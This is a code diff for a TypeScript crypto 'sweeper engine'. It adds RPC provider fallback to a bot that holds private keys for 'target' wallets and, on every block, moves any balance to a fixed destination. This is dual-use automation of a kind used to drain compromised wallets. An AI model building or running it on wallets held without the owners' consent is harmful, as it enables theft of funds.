@@ -1,45 +1,50 @@
-import { createPublicClient, createWalletClient, webSocket, http, formatEther } from 'viem';
+import { createPublicClient, createWalletClient, webSocket, http, fallback, formatEther } from 'viem';
 import { privateKeyToAccount } from 'viem/accounts';
-import { base } from 'viem/chains'; // Change this to mainnet, bsc, etc., based on your target
+import { base } from 'viem/chains'; // Change this to your target chain
 import * as dotenv from 'dotenv';
 import { redis } from '../config/db';
 import { decryptKey } from './encryption';
 
 dotenv.config();
 
-const WSS_URL = process.env.RPC_WSS_URL;
-if (!WSS_URL) throw new Error("Missing RPC_WSS_URL");
+// Accept a comma-separated list of URLs from Railway variables
+// Example: WSS_URLS="wss://alchemy-url...,wss://infura-url...,wss://publicnode-url..."
+const rawWssUrls = process.env.WSS_URLS;
+if (!rawWssUrls) throw new Error("Missing WSS_URLS environment variable");
 
-// High-speed WebSocket client for listening
+const wssUrls = rawWssUrls.split(',').map(url => url.trim());
+const httpUrls = wssUrls.map(url => url.replace('wss://', 'https://'));
+
+// Create an array of WebSocket transports
+const wssTransports = wssUrls.map(url => webSocket(url));
+const httpTransports = httpUrls.map(url => http(url));
+
+// The engine will now automatically rotate through these providers if one fails
 const publicClient = createPublicClient({
     chain: base,
-    transport: webSocket(WSS_URL)
+    transport: fallback(wssTransports)
 });
 
-// Fallback HTTP client for broadcasting transactions reliably
 const broadcastClient = createWalletClient({
     chain: base,
-    transport: http(process.env.RPC_HTTP_URL || WSS_URL.replace('wss://', 'https://'))
+    transport: fallback(httpTransports)
 });
 
 export const startSweeperEngine = async () => {
-    console.log("⚡️ Execution Engine Online: Watching for funds...");
+    console.log(`⚡️ Execution Engine Online: Watching with ${wssUrls.length} RPC providers...`);
 
     publicClient.watchBlocks({
         onBlock: async (block) => {
             try {
-                // 1. Fetch all active target wallets from Redis instantly
                 const keys = await redis.keys('target:*');
                 if (keys.length === 0) return;
 
-                // 2. Check balances concurrently for ultra-low latency
                 await Promise.all(keys.map(async (redisKey) => {
                     const targetAddress = redisKey.split(':')[1] as `0x${string}`;
                     
                     const balance = await publicClient.getBalance({ address: targetAddress });
-                    if (balance === 0n) return; // Wallet is empty
+                    if (balance === 0n) return;
 
-                    // 3. Funds detected! Initiate sweep protocol.
                     const targetData = await redis.hgetall(redisKey);
                     if (!targetData || !targetData.encryptedKey) return;
 
@@ -47,19 +52,14 @@ export const startSweeperEngine = async () => {
                     const account = privateKeyToAccount(privateKey);
                     const destination = targetData.destination as `0x${string}`;
 
-                    // 4. Calculate Gas & Sweep Amount
                     const gasPrice = await publicClient.getGasPrice();
-                    const gasLimit = 21000n; // Standard ETH transfer
+                    const gasLimit = 21000n;
                     const txFee = gasPrice * gasLimit;
 
-                    if (balance <= txFee) {
-                        console.log(`Insufficient funds to cover gas for ${targetAddress}`);
-                        return;
-                    }
+                    if (balance <= txFee) return;
 
                     const sweepAmount = balance - txFee;
 
-                    // 5. Broadcast Transaction
                     const txHash = await broadcastClient.sendTransaction({
                         account,
                         to: destination,
@@ -69,9 +69,6 @@ export const startSweeperEngine = async () => {
                     });
 
                     console.log(`✅ SWEPT! Sent ${formatEther(sweepAmount)} to ${destination}. TX: ${txHash}`);
-                    
-                    // Optional: Deactivate wallet after successful sweep to save resources
-                    // await redis.del(redisKey); 
                 }));
             } catch (error) {
                 console.error("[Engine Error] Block processing failed:", error);
